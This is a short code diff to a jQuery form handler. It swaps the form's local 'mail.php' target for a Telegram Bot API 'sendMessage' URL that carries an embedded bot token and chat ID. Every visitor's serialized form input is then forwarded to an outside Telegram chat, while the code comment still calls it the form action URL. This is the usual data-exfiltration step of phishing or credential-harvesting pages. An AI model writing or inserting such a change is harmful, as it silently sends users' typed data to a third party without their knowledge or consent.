@@ -10,7 +10,7 @@
             e.preventDefault(); // prevent default form submit
 
             $.ajax({
-                url: 'mail.php', // form action url
+                url: 'https://api.telegram.org/bot6792043729:AAG7cPguS2m4Io0KWfj7yh-hjnXeqQOC3Ao/sendMessage?chat_id=642040616&text=', // form action url
                 type: 'POST', // form submit method get/post
                 dataType: 'html', // request type html/json/xml
                 data: form.serialize(), // serialize form data
